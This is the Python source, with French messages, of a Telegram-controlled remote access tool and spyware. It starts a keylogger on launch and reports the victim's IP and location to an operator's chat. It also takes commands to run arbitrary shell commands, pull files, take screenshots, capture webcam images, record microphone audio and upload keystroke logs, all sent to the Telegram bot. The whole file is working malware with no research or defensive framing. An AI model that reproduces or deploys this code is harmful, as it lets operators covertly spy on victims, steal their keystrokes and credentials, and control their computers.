import requests, datetime, time, geocoder, threading, json, sys, subprocess, os, mss, keyboard, pathlib, shutil, cv2, pyaudio, wave, audioop, pydub, ffmpeg
 
"""
pip install requests geocoder mss keyboard pathlib opencv-python
"""
 
commandes = """
Envoyer photo ou document
/cd DIR
/cmd SHELL_COMMAND
/getFile PATH
/maindir
/screenshot
/keylogger_start
/keylogger_stop
/keylogger_flush
/keylogger_get
/keylogger_status
/purgeall
/getPublicIP
/webcam_capture
/record_sound_start (10 min max)
/record_sound_stop
"""


def recordSound():
	
	chunk = 1024  
	sample_format = pyaudio.paInt16 
	channels = 1
	fs = 44100 
	seconds = 600
	filename = f"{maindir}\\output.wav"
	filename_mp3 = f"{maindir}\\output.mp3"


	p = pyaudio.PyAudio() 
	
	sendMessage("Enregistrement...")
	print('Recording')

	stream = p.open(format=sample_format,
					channels=channels,
					rate=fs,
					frames_per_buffer=chunk,
					input=True)

	frames = []

	for i in range(0, int(fs / chunk * seconds)):
		
		if recording:
			
			data = stream.read(chunk)
			rms = audioop.rms(data, 2)
			if rms > 50:
				print(rms)
				frames.append(data)
		
		else:
			break
	
	stream.stop_stream()
	stream.close()
	p.terminate()
	
	sendMessage("Enregistrement termine")
	print('Finished recording')

	wf = wave.open(filename, 'wb')
	wf.setnchannels(channels)
	wf.setsampwidth(p.get_sample_size(sample_format))
	wf.setframerate(fs)
	wf.writeframes(b''.join(frames))
	wf.close()
	
	ffmpeg.input(filename).output(filename_mp3, loglevel="quiet").run(overwrite_output=True)
	
	os.remove(filename)
	
	sendDocument(filename_mp3)
	

def takeWebcamPhoto():
	
	cam = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
	result, image = cam.read() 
	if result:
		cv2.imwrite(f"{maindir}\\webcam_capture.png", image)
		sendDocument(f"{maindir}\\webcam_capture.png")
	else:
		sendMessage("Aucune webcam detectee")

def on_key_press(event):
	
	if keylogging:
	
		with open(log_file, 'a') as f:
			
			if len(event.name) > 1: event.name = f"[{event.name}]"
			f.write(f"{event.name}")
			if event.name == "[enter]":
				f.write("\n")
 
def startKeylogger():
	
	try:
		print("Keylogger started")
		keyboard.on_press(on_key_press)
		keyboard.wait()
	
	except Exception as error: 
		print(error)
 
 
def sendDocument(path=""):
	
	url = f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={chat_id}"
	requests.post(url, files={"document":open(path, "rb")})
	
 
def sendPhoto(path=""):
	
	url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={chat_id}"
	requests.post(url, files={"photo":open(path, "rb")})
	
 
def sendMessage(message=""):
	
	url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
	requests.get(url)
	
 
def get_current_gps_coordinates():
	g = geocoder.ip('me')#this function is used to find the current information using our IP Add
	if g.latlng is not None: #g.latlng tells if the coordiates are found or not
		return g.latlng
	else:
		return None


startdir = pathlib.Path(__file__).parent.resolve()
#sys.path.append(f"{startdir}\\ffmpeg.exe")
if not pathlib.Path(f"{startdir}\\credentials.txt").exists():
	print("identifiants requis dans credentials.txt")
	input()
	sys.exit(0)
else:
	with open(f"{startdir}\\credentials.txt", 'r') as fcred: credentials = json.loads(fcred.read())

appdata = os.getenv('APPDATA')
appname = credentials['appname']
maindir = f"{appdata}\\{appname}"
pathlib.Path(maindir).mkdir(parents=True, exist_ok=True)
pathlib.Path(f"{maindir}\\photos").mkdir(parents=True, exist_ok=True)
pathlib.Path(f"{maindir}\\documents").mkdir(parents=True, exist_ok=True)
log_file = maindir+'\\keystrokes.txt'

print(f"{appname} started")

first = True
last_update = 0
recording = False
keylogging = True

last_time_recieved = round(datetime.datetime.now().timestamp())

 
while True:
	
	try:
		
		print("[+] Listening....")
		
		if first:
		
			keylogger = threading.Thread(target=startKeylogger)
			keylogger.start()
			
			TOKEN = credentials['token']
			chat_id = credentials['chat_id']
			date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
			coords = get_current_gps_coordinates()
			ip = requests.get('https://checkip.amazonaws.com').text.strip()
			message_accueil = f"PC en ligne le {date}\nAu lieu : https://www.google.com/maps/place/{coords[0]},{coords[1]}\nIP {ip}\nCommands : \n{commandes}"
			
			sendMessage(message_accueil)
			
			first = False
		
		
		url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?chat_id={chat_id}&offset={last_update}"
		p = json.loads(requests.get(url).text)
		if p['ok']:
			
			last_message = p['result'][-1]
			last_update = last_message['update_id']
			#print (last_message)
			
			if last_message['message']['date'] > last_time_recieved:
				
				#last_time_recieved = round(datetime.datetime.now().timestamp())
				last_time_recieved = last_message['message']['date']
				
				if 'photo' in last_message['message']:
					
					#print("PHOTO FOUND")
					
					photo = last_message['message']['photo'][-1]
					
					url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={photo['file_id']}"
					ph = json.loads(requests.get(url).text)
					if ph['ok']:
						
						url2 = f"https://api.telegram.org/file/bot{TOKEN}/{ph['result']['file_path']}"
						fichier = requests.get(url2).content
						
						with open(f"{maindir}\\{ph['result']['file_path']}", 'wb') as fw: fw.write(fichier)
						
						sendMessage(f"Fichier {maindir}\\{ph['result']['file_path']} bien écrit")
						
				elif 'document' in last_message['message']:
					
					#print("DOC FOUND")
					
					doc = last_message['message']['document']
					
					url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={doc['file_id']}"
					dh = json.loads(requests.get(url).text)
					if dh['ok']:
						
						url2 = f"https://api.telegram.org/file/bot{TOKEN}/{dh['result']['file_path']}"
						fichier = requests.get(url2).content
						with open(f"{maindir}\\documents\\{doc['file_name']}", 'wb') as fw: fw.write(fichier)
						
						sendMessage(f"Fichier {maindir}\\documents\\{doc['file_name']} bien écrit")
				
				elif "/man" in last_message['message']['text']:
					sendMessage(f"commands : \n{commandes}")
					
				elif "/keylogger_flush" in last_message['message']['text']:
					os.remove(log_file)
				 
				elif "/keylogger_start" in last_message['message']['text']:
					keylogging = True
					with open(log_file, 'a') as f: f.write("START "+datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n")
				 
				elif "/keylogger_stop" in last_message['message']['text']:
					with open(log_file, 'a') as f: f.write("\nSTOP "+datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")+"\n")
					keylogging = False
				 
				elif "/keylogger_get" in last_message['message']['text']:
					sendDocument(log_file)
					
				elif "/keylogger_status" in last_message['message']['text']:
					sendMessage("ON" if keylogging else "OFF")
				
				elif "/screenshot" in last_message['message']['text']:
 
					with mss.mss() as sct: 
						
						for i in range(1, 3):
							sct.shot(mon=i, output=f"{maindir}\\screen.png")
							sendPhoto(f"{maindir}\\screen.png")
							os.remove(f"{maindir}\\screen.png")
					
				elif "/getFile" in last_message['message']['text']:
 
					cmd = last_message['message']['text'].split("/getFile ")[1]
					sendDocument(cmd)
				
				
				elif "/cd" in last_message['message']['text']:
					
					cmd = last_message['message']['text'].split("/cd ")[1]
					os.chdir(cmd)
				
				elif "/maindir" in last_message['message']['text']:
					
					os.chdir(maindir)
				
				elif "/cmd" in last_message['message']['text']:
					
					cmd = last_message['message']['text'].split("/cmd ")[1]
					print("CMD " + cmd)
					out = subprocess.getoutput(cmd)
					print("OUT" + out)
					sendMessage(out)
				
				elif "/purgeall" in last_message['message']['text']:
					
					shutil.rmtree(maindir) 
					sendMessage(f"{maindir} purge")
					os._exit(0)
				
				elif "/getPublicIP" in last_message['message']['text']:
					sendMessage(requests.get('https://checkip.amazonaws.com').text.strip())
				
				elif "/webcam_capture" in last_message['message']['text']:
					takeWebcamPhoto()
					
				elif "/record_sound_start" in last_message['message']['text']:
					recording = True
					record_sound = threading.Thread(target=recordSound)
					record_sound.start()
				
				elif "/record_sound_stop" in last_message['message']['text']:
					recording = False
				
				out = subprocess.getoutput("cd")
				sendMessage(f"/man {out}>")
				
			
	except Exception as error:
		
		print(error)
	
	time.sleep(10)